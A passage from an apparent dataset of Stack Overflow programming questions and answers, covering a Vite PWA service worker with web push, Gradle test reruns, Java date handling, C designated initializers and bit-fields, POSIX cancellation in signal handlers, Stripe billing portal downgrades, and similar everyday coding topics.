            ""src""  : ""icons/icon-192x192.png"",
            ""sizes"": ""192x192"",
            ""type"" : ""image/png""
        },
        // ...
        {
            ""src""    : ""icons/maskable_icon.png"",
            ""sizes""  : ""682x682"",
            ""type""   : ""image/png"",
            ""purpose"": ""maskable""
        }
    ]
};

const getCache = ({ name, pattern, strategy = ""CacheFirst"" }: any) => ({
    urlPattern: pattern,
    handler: strategy,
    options: {
        cacheName: name,
        expiration: {
            maxEntries: 500,
            maxAgeSeconds: 60 * 60 * 24 * 60 // 2 months
        },
        cacheableResponse: {
            statuses: [0, 200]
        }
    }
});

export default defineConfig({
    plugins: [
        laravel({
            input  : [ 'resources/js/app.tsx',],
            refresh: true,
        }),
        react({
            fastRefresh: false
        }),
        VitePWA({
            registerType: 'autoUpdate',
            outDir      : path.resolve(__dirname, 'public'),
            manifest    : manifest,
            manifestFilename: 'manifest.webmanifest', // Change name for app manifest
            injectRegister  : false, // I register SW in app.ts, disable auto registration

            workbox         : {
                globDirectory: path.resolve(__dirname, 'public'), // Directory for caching
                globPatterns : [
                    '{build,images,sounds,icons}/**/*.{js,css,html,ico,png,jpg,mp4,svg}'
                ],
                navigateFallback: null, // Say that we don't need to cache index.html
                swDest       : 'public/serviceWorker.js',
                runtimeCaching: [
                    // Google fonts cache
                    getCache({
                        pattern: /^https:\/\/fonts\.googleapis\.com\/.*/i,
                        name: ""google-fonts-cache"",
                    }),
                    // Google fonts api cache
                    getCache({
                        pattern: /^https:\/\/fonts\.gstatic\.com\/.*/i,
                        name: ""gstatic-fonts-cache""
                    }),
                    // Dynamic cache for assets in storage folder
                    getCache({
                        pattern: /.*storage.*/,
                        name: ""dynamic-images-cache"",
                    }),

                ]
            }
        })
    ],
    resolve: {
        alias     : {
            '@'          : path.resolve(__dirname, 'resources/js'),
            '@hooks'     : path.resolve(__dirname, 'resources/js/hooks'),
            '@assets'    : path.resolve(__dirname, 'resources/js/assets/'),
            '@components': path.resolve(__dirname, 'resources/js/components')
        },
        extensions: ['.js', '.ts', '.tsx', '.jsx'],
    },
});



Old webpush implementation in sw.js:


// ^^^ Activate, Install, Fetch... ^^^

/* Webpush Notifications */

// Receive push notifications
self.addEventListener('push', function (e) {
    if (!(
        self.Notification &&
        self.Notification.permission === 'granted'
    )) {
        //notifications aren't supported or permission not granted!
        return;
    }

    if (e.data) {
        let message = e.data.json();
        e.waitUntil(self.registration.showNotification(message.title, {
            body: message.body,
            icon: message.icon,
            actions: message.actions
        }));
    }
});

// Click and open notification
self.addEventListener('notificationclick', function(event) {
    event.notification.close();

    if (event.action === 'farm') clients.openWindow(""/farm"");
    else if (event.action === 'home') clients.openWindow(""/"");
    else if (event.action === 'training') clients.openWindow(""/mining-training"");
    else if (event.action === 'dns') clients.openWindow(""/shops/dns"");
    else if (event.action === 'ali') clients.openWindow(""/shops/aliexpress"");
    else clients.openWindow(""/farm"");
}, false);



","Should use the inject manifest parametеr and write a custom serviceWorker by workbox prepared methods (workbox documentation is very bad, i think so. You can use some methods from my config)
vite.config.ts:


export default defineConfig({
  plugins: [
    laravel({
      input: ['resources/js/app.tsx', ],
      refresh: true,
    }),
    react({
      fastRefresh: false
    }),
    VitePWA({
      registerType: 'autoUpdate',
      outDir: path.resolve(__dirname, 'public'),
      manifest: manifest,
      manifestFilename: 'manifest.webmanifest', // Change name for app manifest
      injectRegister: false, // I register SW in app.ts, disable auto registration

      // HERE! For custom service worker
      srcDir: path.resolve(__dirname, 'resources/js/'),
      filename: 'serviceWorker.js',
      strategies: 'injectManifest',

      workbox: {
        globDirectory: path.resolve(__dirname, 'public'),
        globPatterns: [
          '{build,images,sounds,icons}/**/*.{js,css,html,ico,png,jpg,mp4,svg}'
        ],
      },
    })
  ],
  resolve: {
    alias: {
      '@': path.resolve(__dirname, 'resources/js'),
      '@hooks': path.resolve(__dirname, 'resources/js/hooks'),
      '@assets': path.resolve(__dirname, 'resources/js/assets/'),
      '@components': path.resolve(__dirname, 'resources/js/components')
    },
    extensions: ['.js', '.ts', '.tsx', '.jsx'],
  },

  // define: {
  //     // By default, Vite doesn't include shims for NodeJS/
  //     // necessary for React-joyride. And probably for another libs
  //     global: {},
  // },
});



/resouces/js/serviceWorker.js:


import {ExpirationPlugin} from 'workbox-expiration';
import {createHandlerBoundToURL, precacheAndRoute, cleanupOutdatedCaches} from 'workbox-precaching';
import {registerRoute} from 'workbox-routing';
import {CacheFirst} from 'workbox-strategies';
import { CacheableResponsePlugin } from 'workbox-cacheable-response/CacheableResponsePlugin';

// Register precache routes (static cache)
precacheAndRoute(self.__WB_MANIFEST || []);

// Clean up old cache
cleanupOutdatedCaches();

// Google fonts dynamic cache
registerRoute(
    /^https:\/\/fonts\.googleapis\.com\/.*/i,
    new CacheFirst({
        cacheName: ""google-fonts-cache"",
        plugins: [
            new ExpirationPlugin({maxEntries: 500, maxAgeSeconds: 5184e3}),
            new CacheableResponsePlugin({statuses: [0, 200]})
        ]
    }), ""GET"");

// Google fonts dynamic cache
registerRoute(
    /^https:\/\/fonts\.gstatic\.com\/.*/i, new CacheFirst({
        cacheName: ""gstatic-fonts-cache"",
        plugins: [
            new ExpirationPlugin({maxEntries: 500, maxAgeSeconds: 5184e3}),
            new CacheableResponsePlugin({statuses: [0, 200]})
        ]
    }), ""GET"");

// Dynamic cache for images from `/storage/`
registerRoute(
    /.*storage.*/, new CacheFirst({
        cacheName: ""dynamic-images-cache"",
        plugins: [
            new ExpirationPlugin({maxEntries: 500, maxAgeSeconds: 5184e3}),
            new CacheableResponsePlugin({statuses: [0, 200]})
        ]
    }), ""GET"");

// Install and activate service worker
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', () => self.clients.claim());

// Receive push notifications
self.addEventListener('push', function (e) {
    if (!(
        self.Notification &&
        self.Notification.permission === 'granted'
    )) {
        //notifications aren't supported or permission not granted!
        console.log('nononono')
        return;
    }

    if (e.data) {
        let message = e.data.json();
        e.waitUntil(self.registration.showNotification(message.title, {
            body: message.body,
            icon: message.icon,
            actions: message.actions
        }));
    }
});

// Click and open notification
self.addEventListener('notificationclick', function(event) {
    event.notification.close();

    if (event.action === 'farm') clients.openWindow(""/farm"");
    else if (event.action === 'home') clients.openWindow(""/"");
    else if (event.action === 'training') clients.openWindow(""/mining-training"");
    else if (event.action === 'dns') clients.openWindow(""/shops/dns"");
    else if (event.action === 'ali') clients.openWindow(""/shops/aliexpress"");
    else if (event.action === 'avito') clients.openWindow(""/avito"");
    else if (event.action === 'friends') clients.openWindow(""/friends"");
    else if (event.action === 'locations') clients.openWindow(""/locations"");
    else if (event.action === 'vk-chat') clients.openWindow(""https://vk.me/join/au1/k0nOTjLasxMO6wX50QuyPfYosyWdPEI="");
    else clients.openWindow(event.action); // Open link from action
}, false);



vite-pwa-plugin has only some info about opportunity to create webpush - documentation
I found some code for service-worker in this repo and copy some code from old generated by default vite.config.ts config
",javascript
how to run gradle test when all tests are uptodate,"I have my grade script set up.
When I execute the Gradle build, everything is working and it runs the jUnit tests.
After that when I run the Gradle test I get the following:
C:\Users\..\..\Project>gradle test
:compileJava UP-TO-DATE
:processResources UP-TO-DATE
:classes UP-TO-DATE
:compileTestJava UP-TO-DATE
:processTestResources UP-TO-DATE
:testClasses UP-TO-DATE
:test UP-TO-DATE

When I perform gradle clean, then Gradle build works, of course...
I want to be able to reset only the tests, not build the whole project: how should I do this?
","One option would be using the --rerun-tasks flag in the Forcing tasks to execute section. This would rerun all the the test task and all the tasks it depends on.
If you're only interested in rerunning the tests then another option would be to make gradle clean the tests results before executing the tests. This can be done using the cleanTest task.
Some background - the Java plugin defines a clean tasks to each of the other tasks. According to the Tasks documentation:

cleanTaskName - Deletes files created by specified task. cleanJar will delete the JAR file created by the jar task, and cleanTest will delete the test results created by the test task.

Therefore, all you need in order to re-run your tests is to also run the cleanTest task, i.e.:
gradle cleanTest test
",java
detect if the element im currently in is the youngest songrandsongrandgrand son of an element,"I am looping around span elements which belongs to frag class. I wanted to detect if the frag element im currently in is the youngest son/grandson/grandgrand son(from left to right) of the a span element which belongs to frag class and belongs to cond class and has an ""if"" or ""else if"" in its text
contenteditable div (textarea)
if( ((b>0) && (b<10)) || b==15 )

HTML equivalent
<div id=""board"">
  <div>
  <span class=""frag cond"">if<span class=""openParen bm1"">(</span> <span class=""frag cond""><span class=""openParen bm2"">(</span><span class=""frag cond""><span class=""openParen bm3"">(</span><span class=""frag"">b</span>&gt;0<span class=""closeParen bm3"">)</span></span> && <span class=""frag cond""><span class=""openParen bm4"">(</span><span class=""frag"">b</span>&lt;10<span class=""closeParen bm4"">)</span></span><span class=""closeParen bm2"">)</span></span> || <span class=""frag"">b</span>==15 <span class=""closeParen bm1"">)</span></span>
  </div>
</div>

(My system is like a code editor by the way, so i am using a contenteditable div) Here, i wanted to detect if im on the 3rd b.
byossarian has helped me with this:
var $elem = $('.frag').eq(fragNum);

var validAncest = $elem.parents('.cond').filter(function(i){
    return /^\s*(if|else\s+if)/.test($(this).text());
}).filter(function(i){
    var generations = 0,
    $elemCrawl = $('.frag').eq(fragNum);

    while ($elemCrawl[0] && $elemCrawl[0] !== this) {
        generations++;
        $elemCrawl = $elemCrawl.parent();
    }

    if ($elemCrawl[0] && generations < 4) {
        return true;
    }
});

finds all the ancestors of the element, it then filters then once to narrow down to those starting with 'if' or 'else if'. It then filters these to those that are either the parent, grandparent or great-grandparent (generations < 4) of the original element.
the condition to check will be:
if (validAncest.length && !$elem.nextAll('.frag').length) {
    alert('target acquired');
}

It checks that there is at least one valid ancestor (validAncest.length) AND that the original element is the last child of it's IMMEDIATE parent that has the class 'frag' (!$elem.nextAll('.frag').length)
The problem
IMMEDIATE parent should also be the last child/grandchild of the element with ""if"" or ""else if""
So from the example above, the first b will already give me the alert where it should be on the 3rd b
UPDATE should pop the alert at the 2nd b not at (b<10)

","Try changing validAncest with:
var validAncest = $elem.parents('.cond').filter(function(i){
    return /^\s*(if|else\s+if)/.test($(this).text());
}).filter(function(i){
    var generations = 1,
    $elemCrawl = $('.frag').eq(fragNum).parent();

    while ($elemCrawl[0] && $elemCrawl[0] !== this) {
        if (!$elemCrawl.is(':last-child')) {return false;}
        generations++;
        $elemCrawl = $elemCrawl.parent();
    }

    if ($elemCrawl[0] && generations < 4) {
        return true;
    }
});

This should include:

The parent of $elem provided it starts with 'if'/'else if'
The grandparent provided it starts with 'if'/'else if' AND the parent of $elem is the last child of this grandparent
The great-grandparent provided it starts with 'if'/'else if' AND the parent of $elem is the last child of the intermediate grandparent AND that grandparent is the last child of the great-grandparent

",javascript
how to get the first day of the current week and month,"I have the date of several events expressed in milliseconds[1], and I want to know which events are inside the current week and the current month, but I can't figure out how to obtain the first day (day/month/year) of the running week and convert it to milliseconds, the same for the first day of the month.
[1]Since January 1, 1970, 00:00:00 GMT

","This week in milliseconds:    
// get today and clear time of day
Calendar cal = Calendar.getInstance();
cal.set(Calendar.HOUR_OF_DAY, 0); // ! clear would not reset the hour of day !
cal.clear(Calendar.MINUTE);
cal.clear(Calendar.SECOND);
cal.clear(Calendar.MILLISECOND);

// get start of this week in milliseconds
cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek());
System.out.println(""Start of this week:       "" + cal.getTime());
System.out.println(""... in milliseconds:      "" + cal.getTimeInMillis());

// start of the next week
cal.add(Calendar.WEEK_OF_YEAR, 1);
System.out.println(""Start of the next week:   "" + cal.getTime());
System.out.println(""... in milliseconds:      "" + cal.getTimeInMillis());

This month in milliseconds:
// get today and clear time of day
Calendar cal = Calendar.getInstance();
cal.set(Calendar.HOUR_OF_DAY, 0); // ! clear would not reset the hour of day !
cal.clear(Calendar.MINUTE);
cal.clear(Calendar.SECOND);
cal.clear(Calendar.MILLISECOND);

// get start of the month
cal.set(Calendar.DAY_OF_MONTH, 1);
System.out.println(""Start of the month:       "" + cal.getTime());
System.out.println(""... in milliseconds:      "" + cal.getTimeInMillis());

// get start of the next month
cal.add(Calendar.MONTH, 1);
System.out.println(""Start of the next month:  "" + cal.getTime());
System.out.println(""... in milliseconds:      "" + cal.getTimeInMillis());

",java
how to write e2e tests with cypress for a vue tailwind css app,"When I look at Cypress.io docs, there are examples of how to write tests and they use class selectors a lot. My problem is that my TailwindCSS app does not really have those kinds of classes but many small classes that would be very fragile to target for tests. What is a good solution to write e2e tests for a Tailwind app?
Example from the docs:
it('adds todos', () => {
  cy.visit('https://todo.app.com')

  cy.get('.new-input').type('write code{enter}').type('write tests{enter}')

  cy.get('li.todo').should('have.length', 2)

  cy.get('.action-email').type('fake@email.com').should('have.value', 'fake@email.com')
})

But my app looks nothing like it, I don't have class selectors like that:
<div class=""relative flex min-h-screen flex-col justify-center overflow-hidden bg-gray-50 py-6 sm:py-12"">
  <span class=""absolute inset-0 bg-center""></span>

  <div class=""relative bg-white px-6 pt-10 pb-8 shadow-xl ring-1 ring-gray-900/5 sm:mx-auto sm:max-w-lg sm:rounded-lg sm:px-10"">
    <div class=""mx-auto max-w-md"">
      <img v-if=""showLogo"" src=""logo.svg"" class=""h-6"" />
      
      <div class=""divide-y divide-gray-300/50"">
        <div class=""space-y-6 py-8 text-base leading-7 text-gray-600"">
          My todo app
        </div>

        <button @click=""createTodo"" class=""bg-white rouned-full px-2 py-4 border border-gray-200"">
          Create a new todo
        </button>
      </div>
    </div>
  </div>
</div>

Wouldn't it be silly and fragile to try and target many classes like this? Is there a better alternative?
it('adds todos', () => {
  cy.visit('https://todo.app.com')

  cy.get('.bg-white.rouned-full.px-2.py-4.border.border-gray-200').first().click()
  cy.get('.space-y-6.py-8.text-base.leading-7.text-gray-600').should('have.value', 'fake todo')
})

","Consider using data-cy attributes which is the recommendation from Cypress. It's pragmatic because you know exactly which elements are tagged, but could be labour-intensive.
// Example - cypress.io

<div class=""container"">
  <h1 class=""Hero-TagLine mt-0"" data-cy=""tag-line"" style=""font-size:5.6rem;line-height:7rem"">
    <div>The web has evolved.<br>Finally, testing has too.</div>
  </h1>
  <h2 class=""Hero-ByLine mb-0"" data-cy=""by-line"">Fast, easy and reliable testing...

The recommendation from Testing Library is to use roles texts, and aria attributes.
Also consider using traversal commands to navigate from key elements.
",javascript
upos mappings  tensorflow datasets tdfs,"I am using the tensorflow tdfs dataset extreme/pos which I retrieve using the code below.  It is annotated with universal part of speech POS labels.  These are int values.  Its fairly easy to map them back to their part of speech by creating my own mapping (0 = ADJ, 7 = NOUN, etc.) but I was wondering if there is a way of retrieving these class mappings from the tdfs dataset?
(orig_train, orig_dev, orig_test), ds_info = tfds.load(
'xtreme_pos/xtreme_pos_en',
split=['train', 'dev', 'test'],
shuffle_files=True,
with_info=True
)

","One way is to dig into Tensorflow code to see where is defined the list of POS and then import it to use in your code.
You can find the list of the POS in the Github code of tensorflow Datasets there (UPOS constant):
https://github.com/tensorflow/datasets/blob/master/tensorflow_datasets/core/dataset_builders/conll/conllu_dataset_builder_utils.py#L31
The item order is their index so with display(pd.Series(UPOS)), you get:


Another way would be to extract the items from the upos column of tfds.as_dataframe (taking a few rows, concatenating the upos values, splitting by the separating character and taking the set() to get the unique values.
",python
how to set icon for created skp file by using c api,"Currently I am trying to create .skp files from some external geometry data.
I have managed to create all required geometries, but after i save model by using following code:
    if (SUModelSaveToFileWithVersion(model, model_path, SUModelVersion::SUModelVersion_SU2018) != SU_ERROR_NONE){
        return 0;
    }
    if (SUModelRelease(&model) != SU_ERROR_NONE){
        return 0;
    }
    SUTerminate();

model is saved without small preview icon(general .skp icon is used).
Is there a way to replace it with at least a white icon?
","This would be a bug in the API when saving. I'm afraid there is not workaround for that via the C API. (Btw, you can report issues in the SketchUp API issue tracker: https://github.com/SketchUp/api-issue-tracker/issues)
",c
warning about generic wildcard when returning future object,"I'm wondering why do I get warning message when I am trying to return Future object with generic wildcard, or maybe I dont have to worry about it at all?
My code:
public static Future<?> getExecutableFutureTask(Callable<?> task, AsyncTaskExecutor executor) {
    return executor.submit(() -> {
        try {
            task.call();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    });
}

Sonar tries to force me to not use generic wildcard, even though AsyncTaskExecutor.submit method returns Future<?> object.
Can someone tell me why I've got this warning message?
","
even though AsyncTaskExecutor.submit method returns Future<?> object.

No it doesn't. it returns a Future<T> where the T is from what you submit to it. The way you've set up your signature, sure, that ? here. But that's your own doing.
What sonar wants you to write, is this:
public static <T> Future<T> getExecutableFutureTask(Callable<T> task, AsyncTaskExecutor executor) {
    return executor.submit(() -> {
        try {
            return task.call();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    });
}

In other words, the executor 'framework' lets you 'link' the type of the provided Callable to the type of the Future it makes for you, and sonar wants you to maintain that link. There is no harm in doing this, and it might be useful for some users of your getExecutableFutureTask.
I'm not sure why this method is useful, though.
",java
strange array initialize expression,"What is the meaning of following Code? Code is from the regression test suite of GCC.
static char * name[] = {
   [0x80000000]  = ""bar""
};

","In  C99  you can specify the array indices to assigned value, For example: 
static char * name[] = {
   [3]  = ""bar""  
};

is same as: 
static char * name[] = { NULL, NULL, NULL, ""bar""};

The size of array is four. Check an example code working at ideaone. In your code  array size is 0x80000001 (its an hexadecimal number).
Note: Uninitialized elements initialized with 0.   

5.20 Designated Initializers:
In ISO C99 you can give the elements in any order, specifying the array indices or structure field names they apply to, and GNU C allows this as an extension in C89 mode as well. This extension is not implemented in GNU C++.
  To specify an array index, write [index] = before the element value. For example,
 int a[6] = { [4] = 29, [2] = 15 };

is equivalent to
 int a[6] = { 0, 0, 15, 0, 29, 0 };


One more interesting declaration is possible in a GNU extension:  

An alternative syntax for this which has been obsolete since GCC 2.5 but GCC still accepts is to write [index] before the element value, with no =.
To initialize a range of elements to the same value, write [first ... last] = value. For example,
 int widths[] = { [0 ... 9] = 1, [10 ... 99] = 2, [100] = 3 }; 


Note: that the length of the array is the highest value specified plus one.   
Additionally, we  can combine this technique of naming elements with ordinary C initialization of successive elements. Each initializer element that does not have a designator applies to the next consecutive element of the array or structure. For example:  
 int a[6] = { [1] = v1, v2, [4] = v4 };

is equivalent to
 int a[6] = { 0, v1, v2, 0, v4, 0 };

Labeling the elements of an array initializer is especially useful when the indices are characters or belong to an enum type. For example:
 int whitespace[256]  = { [' '] = 1,  ['\t'] = 1, ['\h'] = 1,
                          ['\f'] = 1, ['\n'] = 1, ['\r'] = 1 
                        };

",c
why does the compiler init this variable to the wrong value is this an alignment issue,"I'm working with an embedded C compiler (ARM cortex-m3 chip) and it seems to initialize the wrong value to a struct.  Why does this happen? If it's an alignment issue, shouldn't the compiler know to align an int32u to a 4-byte boundary?
Note: the printf merely throws bytes out of the serial port. There is no stdio.h implementation on this chip.
typedef struct
{
    int32u startTime; 
    int16u length;
    int32u offTime;
} Cycle;

Cycle cycle = 
{
    315618000, 
    1200,
    0
};


void init()
{
   printf(""\r\nInitialized! Cycle Start: %d"", cycle.startTime);

   cycle.startTime = 315618000;
   cycle.length = 1200;

   printf("" Cycle Start: %d"", cycle.startTime);

}


Output: 
  Initialized! Cycle Start: 631237200 Cycle Start: 315618000

Note:: This NOT a printf issue.  The debugger verifies the value in memory as 631237200 as well.
","In some embedded systems, static initialization is not set up to happen automatically. This goes against C specifications, but sometimes that's the way it is. Note that this may be true for both data and bss segments i.e. you may find that uninitialized statics may NOT be initialized to zero either.
The solution to this is, unfortunately, system specific. You may find something in your complier system documentation that lets you invoke the initialization of the static elements.
",c
defining a bit but without a name,"So I have some code for the iodefine of my board. I see a lot of these in structs. What exactly is it doing? Is it just a placeholder for the last 4 bits? Why doesn't it cause a compiler error and what is it used for?
union {
    unsigned char BYTE;
    struct {
        unsigned char OVRF:1;
        unsigned char IDLNF:1;
        unsigned char MODF:1;
        unsigned char PERF:1;
        unsigned char :4;        <------------
    } BIT;
} SPSR;

I hope thats not too many questions, I just found this very interesting.
","It's an unnamed bit-field. It is used to provide padding (usually between adjacent bit-fields).

(C99, 6.7.2.1p11) ""A bit-field declaration with no declarator, but only a colon and a width, indicates an unnamed bit-field""

",c
creating and running executable by hand,"Just for interest sake, I want to compile and run the simplest C program by hand;
//t.c

int main() {
       return 0;
}

So I want to do:

$ cpp t.c : should do nothing in this case, since no preprocessing to be done
$ cc1 t.c : should compile t.c -> t.s
$ as -o t.o t.c : should assembe t.s -> t.o
$ ld t.o : should produce executable a.out (nothing really to be done)

The problem I'm having is with as, since running the final command yields:
ld: warning: cannot find entry symbol _start; defaulting to 00000000000400b0

What's going on? I purposly left out libc to keep this as simple as possible, but I don't understand what's happening. What flags am I missing?
","There's a bit more to loading and executing a program. As you can guess from the linker output, execution starts not at main, but at _start, which is provided by the CRT (C runtime) library that is bundled with the compiler and gets linked with your code behind the scene.
Here and here are some overviews of what's going on at program startup on Linux.
Do cc -v -Wall on your dummy source to see all the required steps in detail.
",c
why is scheduled downgrade at period end not triggering in stripe billing portal,"I'm using the Stripe API to configure the billing portal and allow subscription updates with scheduled downgrades. But, when I attempt to select a lower tiered plan with a shorter interval, the downgrade is not scheduled to occur at the period end, even though I believe my configuration is correct.
According to the Stripe documentation from October 2024:

""You can now configure the customer portal so that subscription downgrades occur at the end of the billing cycle, rather than immediately.""

I made sure my Stripe SDK is updated to the latest version too.
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
    apiVersion: '2024-12-18.acacia'
});

const configuration = await stripe.billingPortal.configurations.create({
    features: {
        payment_method_update: { enabled: true },
        subscription_cancel: { enabled: true, mode: 'at_period_end' },
        subscription_update: {
            enabled: true,
            proration_behavior: 'none',
            default_allowed_updates: ['price'],
            products: subscriptionUpdateProducts,
            schedule_at_period_end: {
                conditions: [
                    { type: 'shortening_interval' } // Schedule downgrades at period end (Not working)
                ]
            }
        },
        invoice_history: { enabled: true }
    },
    business_profile: {
        headline: 'Manage your subscription'
    }
});

const session = await stripe.billingPortal.sessions.create({
    customer: customerId,
    configuration: configuration.id,
    return_url: `${process.env.FRONTEND_URL}/app/price/price1`
});

Current subscription selected

New subscription updated to, clearly with a shortened interval as its a per month subscription but still trying to charge me immediately

","The issue was that I had three separate subscription products (e.g., one month, three months, and one year), and users were switching between them. However, for the billing portal to handle subscription updates correctly, the subscriptions need to be part of a single product with multiple pricing tiers.
The correct approach is to have a single subscription product with all pricing tiers (e.g., one month, three months, one year) associated with it. Users should be allowed to change prices within the same product. If a user changes to a different product, the billing portal will process the change immediately instead of applying the correct ""schedule at period end"" behavior.
",javascript
how to fix the error quotqobjectmovetothreadquot in opencv in python,"I am using opencv2 in python with the code
import cv2
cv2.namedWindow(""output"", cv2.WINDOW_NORMAL)       
cv2.imshow(""output"",im)
cv2.resizeWindow('output', 400,400)
cv2.waitKey(0)
cv2.destroyAllWindows()

I have the error as 
QObject::moveToThread: Current thread (0x1d2c9cf0) is not the object's thread (0x1d347b20).
Cannot move to target thread (0x1d2c9cf0)

I debug and found that it happened when I use cv2.waitKey(0). How should I fix it? Thanks
Update: I am using 3.3.0.0. If I use older version, I have error
OpenCV Error: Unspecified error (The function is not implemented. Rebuild the library with Windows, GTK+ 2.x or Carbon support. If you are on Ubuntu or Debian, install libgtk2.0-dev and pkg-config, then re-run cmake or configure script) in cvDestroyAllWindows, file /io/opencv/modules/highgui/src/window.cpp, line 577
Traceback (most recent call last):
  File ""tools/demo_handbone.py"", line 220, in <module>
    demo(net, im_name)
  File ""tools/demo_handbone.py"", line 159, in demo
    cv2.destroyAllWindows()
cv2.error: /io/opencv/modules/highgui/src/window.cpp:577: error: (-2) The function is not implemented. Rebuild the library with Windows, GTK+ 2.x or Carbon support. If you are on Ubuntu or Debian, install libgtk2.0-dev and pkg-config, then re-run cmake or configure script in function cvDestroyAllWindows

","First of all, uninstall any versions of OpenCV you may have installed. If you installed using pip:
sudo pip uninstall opencv-python

Next, try installing OpenCV using your Linux distro's package manager. For Ubuntu/Debian, this is:
sudo apt install libopencv-dev python3-opencv

",python
cancellation points in signal handlers,"What happens if a program calls a function which is a cancellation point from a signal handler? There are a number of functions which POSIX specifies as both async-signal-safe and cancellation points. If a signal handler calls such a function and cancellation is acted upon, the result is quite similar to what would happen if the thread had enabled asynchronous cancellation - actually much worse, because all the cancellation cleanup handlers, which are probably not async-signal-safe, would be called from a signal-handler context.
What does POSIX actually specify in this case, and what do implementations actually do? I can't find any language in POSIX that would forbid cancellation points in signal handlers from being acted upon, nor any such protection in the glibc/nptl source.
","I'm not aware that POSIX even dares to mention this topic, but I haven't done an exhaustive search.
Some brief experimentation with a gcc/nptl system reveals that, as I suspected and I think you did too, there is no such protection in NPTL - the cancellation handlers do indeed get called, from within the signal handler context.
The program below (apologies for the hackiness etc) displays the following output:
Signal handler called
Sent cancellation
Cleanup called
In sighandler

... indicating that:

the signal handler got called
the other thread then called pthread_cancel()
the cancellation handler then got called, without the signal handler completing

Here's the program:
#include <stdio.h>
#include <pthread.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

pthread_t mainthread;

int in_sighandler = 0;

void
cleanup (void *arg)
{
    write(1, ""Cleanup called\n"", strlen(""Cleanup called\n""));
    if (in_sighandler) {
        write(1, ""In sighandler\n"", strlen(""In sighandler\n""));
    } else {
        write(1, ""Not in sighandler\n"", strlen(""In sighandler\n""));
    }
}


void
sighandler (int sig, siginfo_t *siginfo, void *arg)
{
    in_sighandler = 1;
    write(1,""Signal handler called\n"", strlen(""Signal handler called\n""));  // write() is a CP
    usleep(3000000); // usleep() is a CP; not strictly async-signal-safe but happens to be so in Linux
    write(1, ""Signal handler exit\n"", strlen(""Signal handler exit\n""));
    in_sighandler = 0;
}

void *
thread (void *arg)
{
    sleep(1);
    pthread_kill(mainthread, SIGUSR1);
    usleep(500000);
    pthread_cancel(mainthread);
    printf(""Sent cancellation\n"");
    return (NULL);
}

int
main (int argc, char **argv)
{
    int rc;
    struct sigaction sa;
    pthread_t threadid;

    mainthread = pthread_self();

    // Set up a signal handler to test its cancellation properties
    sa.sa_sigaction = &sighandler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO;
    rc = sigaction(SIGUSR1, &sa, NULL);
    assert(rc == 0);

    // Set up a thread to send us signals and cancel us
    rc = pthread_create(&threadid, NULL, &thread, NULL);
    assert(rc == 0);

    // Set up cleanup handlers and loop forever
    pthread_cleanup_push(&cleanup, NULL);
    while (1) {
        sleep(60);
    }
    pthread_cleanup_pop(0);
    return (0);
}

",c
does exist a standardized string table implementation  is my implementation in c good  looking to discuss topic,"I'm developing a C library to write a custom binary format to store levels for a game.
I had a problem about optimizing the usage of strings for this file, I have two use cases of strings in this file: cells on a grid for tiles and metadata.
The cells specify how the game world look like and ask 3 strings for what texture to display for a floor, walls and ceiling; then the metadata is key/value pairs.
With my first attempts creating a big grid filled with the same strings for the cells ends up into a file that grows exponentially, that's not good. I need to optimize this.
My attempt
The best case would be to write the string once, so I thought of a string table placed at the end of the file, each string is stored with an unique integer key. I haven't found any stardardized implementation of a string table so I've made my own.
I've made a struct that implements a dynamic set of entries, each entry contains the string with his hash and a generated unique key. The hash algorithm is really stupid, it adds the first 50 characters into one big number and collision are handled by comparing two strings with matching hashes, it's good enough.
the structure looks like this:
struct sentry_s
{
    char *value;
    uint32_t key, key_hash;
    size_t use_count; // when hit zero entry is removed.
}

// a SET that store unique strings with a key.
struct stable_s
{
    struct sentry_s *entries;
    size_t count, capacity;
}

// actual func names are longer, ofc.
struct sentry_s* tput (struct stable_s *table, char *string);
struct sentry_s* tget (struct stable_s *table, uint32_t key);
void trem (struct stable_s *table, uint32_t key);

I do really like this structure because I can use binary search to increase speed for one of these things:

Order the array by keys will increase reading and erase speed by his key.
Order the array by hash will increase inserting speed by the string value.

I want to increase reading speed to prioritize the game loading these levels.
The question
I came here to ask if there is a better implementation for a string table, what would other devs do? Do exists papers that specify a standardized string table?
Could this structure be improved to be both fast at reading and writing?
I'm interested on the topic and it's not the first time I've seen the use string tables, for example compiled code have a string table for static strings.
The actual question:  Is the above diatribe from:

Markov chain
Generative AI
College Dare bet
.

","First, don't malloc() each individual string.  Instead, malloc() one giant array of characters and fill it with all the strings concatenated with null terminators between them.  Like this:
hello world\0foo\0bar\0

Next, use the starting address of any string as its ID:
hello world\0foo\0bar\0
01234567890 1234 5678 9

So ""foo"" has ID 12.
Your use case doesn't seem to need support for erasing strings, and you can append any time (use realloc() to double the table capacity if needed).
The IDs should be stored in the smallest integer type that makes sense.  Probably uint16_t or uint32_t.  If you want a special value you can store a null terminator at the start and its ID will be 0.
Binary search will still work, but if you need O(1) lookup by string you can add a hash table where each entry is (string_hash, ID).  Then to do lookup by string you hash the string, get its ID from the hash table, and use that ID to get the full string to compare (to confirm it's not a hash collision).  This way you don't need to store all the strings a second time, and the hash table only contains integers so the entire solution only has two heap allocations in use at any time.  The string hash can probably be 32 bits, using a full 64 bit hash is probably overkill if you use a standard string hash function instead of your weak one.
Don't bother writing your own hash table, there are many great existing ones.
",c
issues with the color comand in opengl,"The code ahead is supposed to draw the text in escolha_de_magias in red, but keeps drawing it in green.
#include<GL/glut.h>

#include <stdio.h>

const int posicao=28.0;/*esta constante sera usada para fixar a posicao do inicio do texto para a funcao de escrita*/

float VERTICAL=30.0, HORIZ=30.0;

int seletor=1;

char escolha_de_magias[]={""A whole bunch of text""};

void escritoura (char *p)/* FUNCAO QUE ESCREVE NA TELA. Esta pronta mas sujeita a mudanças*/
{
    int contcarac=0, position=posicao, selecao=0;
    
    float cor[4]={ 0.0, 0.0, 0.0, 0.0};
    
    p++;
    
    glRasterPos2f(-28.0, position);
    
    while(*p)
    {
        if(*p=='1' || *p=='2' || *p=='3' || *p=='4' || *p=='5' || *p=='6' || *p=='7' || *p=='8' || *p=='9' || *p=='0')/* testa se eu estou olhando para um algarismo*/
        {
            glColor3d(1.0, 0.0, 0.0);
        }
    }
    
